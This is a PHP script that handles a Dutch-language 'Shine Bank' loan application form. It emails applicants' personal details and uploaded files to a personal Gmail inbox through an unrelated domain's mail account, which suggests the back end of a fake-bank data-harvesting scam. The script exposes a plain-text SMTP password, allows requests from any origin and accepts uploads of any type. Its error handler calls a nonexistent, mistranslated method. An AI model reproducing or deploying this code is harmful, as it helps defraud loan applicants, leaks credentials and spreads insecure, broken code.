<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

function sendResponse($success, $message) {
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    sendResponse(false, 'Methode niet toegestaan');
}

// Configuration SMTP directe (sans .env)
$smtpHost = 'mail.craft-style.com';
$smtpUsername = 'shinebanque@craft-style.com';
$smtpPassword = '91rerdakonde';
$smtpPort = 465;
$smtpSecure = PHPMailer::ENCRYPTION_SMTPS; // SSL
$adminEmail = 'shinebanque0@gmail.com';
$fromEmail = 'shinebanque@craft-style.com';
$fromName = 'Shine Bank';

$requiredFields = [];
$formData = [];

if (isset($_POST['firstName'])) $formData['Voornaam'] = $_POST['firstName'];
if (isset($_POST['lastName'])) $formData['Naam'] = $_POST['lastName'];
if (isset($_POST['email'])) $formData['Email'] = $_POST['email'];
if (isset($_POST['phone'])) $formData['Telefoon'] = $_POST['phone'];
if (isset($_POST['birthdate'])) $formData['Geboortedatum'] = $_POST['birthdate'];
if (isset($_POST['loanType'])) $formData['Type krediet'] = $_POST['loanType'];
if (isset($_POST['amount'])) $formData['Bedrag'] = $_POST['amount'];
if (isset($_POST['duration'])) $formData['Looptijd'] = $_POST['duration'];
if (isset($_POST['monthlyPayment'])) $formData['Maandelijkse betaling'] = $_POST['monthlyPayment'];
if (isset($_POST['message'])) $formData['Bericht'] = $_POST['message'];

if (empty($formData['Email']) || !filter_var($formData['Email'], FILTER_VALIDATE_EMAIL)) {
    sendResponse(false, 'Ongeldig e-mailadres');
}

$clientEmail = $formData['Email'];

$uploadedFiles = [];
$uploadDir = 'uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

if (!empty($_FILES)) {
    foreach ($_FILES as $fieldName => $file) {
        if ($file['error'] === UPLOAD_ERR_OK) {
            $fileName = basename($file['name']);
            $filePath = $uploadDir . uniqid() . '_' . $fileName;
            
            if (move_uploaded_file($file['tmp_name'], $filePath)) {
                $uploadedFiles[] = [
                    'path' => $filePath,
                    'name' => $fileName,
                    'field' => $fieldName
                ];
            }
        }
    }
}

try {
    // Email 1: Envoi à l'administrateur avec toutes les données
    $mail1 = new PHPMailer(true);
    $mail1->isSMTP();
    $mail1->Host = $smtpHost;
    $mail1->SMTPAuth = true;
    $mail1->Username = $smtpUsername;
    $mail1->Password = $smtpPassword;
    $mail1->SMTPSecure = $smtpSecure;
    $mail1->Port = $smtpPort;
    $mail1->CharSet = 'UTF-8';
    
    $mail1->setFrom($fromEmail, $fromName);
    $mail1->addReplyTo($fromEmail, $fromName);
    $mail1->addAddress($adminEmail);
    $mail1->Subject = 'Nieuwe aanvraag vanaf de Shine Bank website';
    
    $bodyAdmin = "<h2>Nieuwe aanvraag ontvangen</h2>";
    $bodyAdmin .= "<table border='1' cellpadding='10' style='border-collapse: collapse;'>";
    foreach ($formData as $key => $value) {
        $bodyAdmin .= "<tr><td><strong>$key</strong></td><td>" . htmlspecialchars($value) . "</td></tr>";
    }
    $bodyAdmin .= "</table>";
    
    if (!empty($uploadedFiles)) {
        $bodyAdmin .= "<h3>Bijlagen:</h3><ul>";
        foreach ($uploadedFiles as $file) {
            $bodyAdmin .= "<li>" . htmlspecialchars($file['name']) . " (veld: " . htmlspecialchars($file['field']) . ")</li>";
            $mail1->addAttachment($file['path'], $file['name']);
        }
        $bodyAdmin .= "</ul>";
    }
    
    $mail1->isHTML(true);
    $mail1->Body = $bodyAdmin;
    
    if (!$mail1->send()) {
        throw new Exception("Fout bij verzenden naar beheerder: " . $mail1->ErrorInfo);
    }
    
    // Email 2: Confirmation au client
    $mail2 = new PHPMailer(true);
    $mail2->isSMTP();
    $mail2->Host = $smtpHost;
    $mail2->SMTPAuth = true;
    $mail2->Username = $smtpUsername;
    $mail2->Password = $smtpPassword;
    $mail2->SMTPSecure = $smtpSecure;
    $mail2->Port = $smtpPort;
    $mail2->CharSet = 'UTF-8';
    
    $mail2->setFrom($fromEmail, $fromName);
    $mail2->addReplyTo($fromEmail, $fromName);
    $mail2->addAddress($clientEmail);
    $mail2->Subject = 'Bevestiging van uw aanvraag - Shine Bank';
    
    $bodyClient = '<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<title>Bevestiging van uw aanvraag</title>
<style>
body {
  font-family: "Segoe UI", sans-serif;
  background-color: #f8f9fb;
  color: #333;
  text-align: center;
  padding: 40px;
}
.container {
  background: white;
  border-radius: 10px;
  padding: 30px;
  max-width: 600px;
  margin: auto;
  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}
h1 {
  color: #003366;
  margin-bottom: 20px;
}
p {
  font-size: 16px;
  line-height: 1.6;
}
.footer {
  margin-top: 30px;
  font-size: 13px;
  color: #888;
}
.logo {
  font-size: 22px;
  font-weight: bold;
  color: #007bff;
  margin-bottom: 20px;
}
</style>
</head>
<body>
  <div class="container">
    <div class="logo">✨ Shine Bank ✨</div>
    <h1>Bevestiging van uw aanvraag</h1>
    <p>✅ Uw aanvraag is goed ontvangen door <strong>Shine Bank</strong>.</p>
    <p>U ontvangt een antwoord binnen <strong>3 werkdagen</strong>.</p>
    <p>Dank u voor uw vertrouwen.</p>
    <div class="footer">© 2025 Shine Bank – Tous droits réservés.</div>
  </div>
</body>
</html>';
    
    $mail2->isHTML(true);
    $mail2->Body = $bodyClient;
    
    if (!$mail2->send()) {
        throw new Exception("Fout bij verzenden van bevestiging: " . $mail2->ErrorInfo);
    }
    
    sendResponse(true, 'Uw aanvraag is succesvol verzonden. U ontvangt binnen enkele ogenblikken een bevestigingsmail.');
    
} catch (Exception $e) {
    sendResponse(false, "Fout bij verzenden: " . $e->getBericht());
} finally {
    // Nettoyage des fichiers uploadés
    foreach ($uploadedFiles as $file) {
        if (file_exists($file['path'])) {
            unlink($file['path']);
        }
    }
}
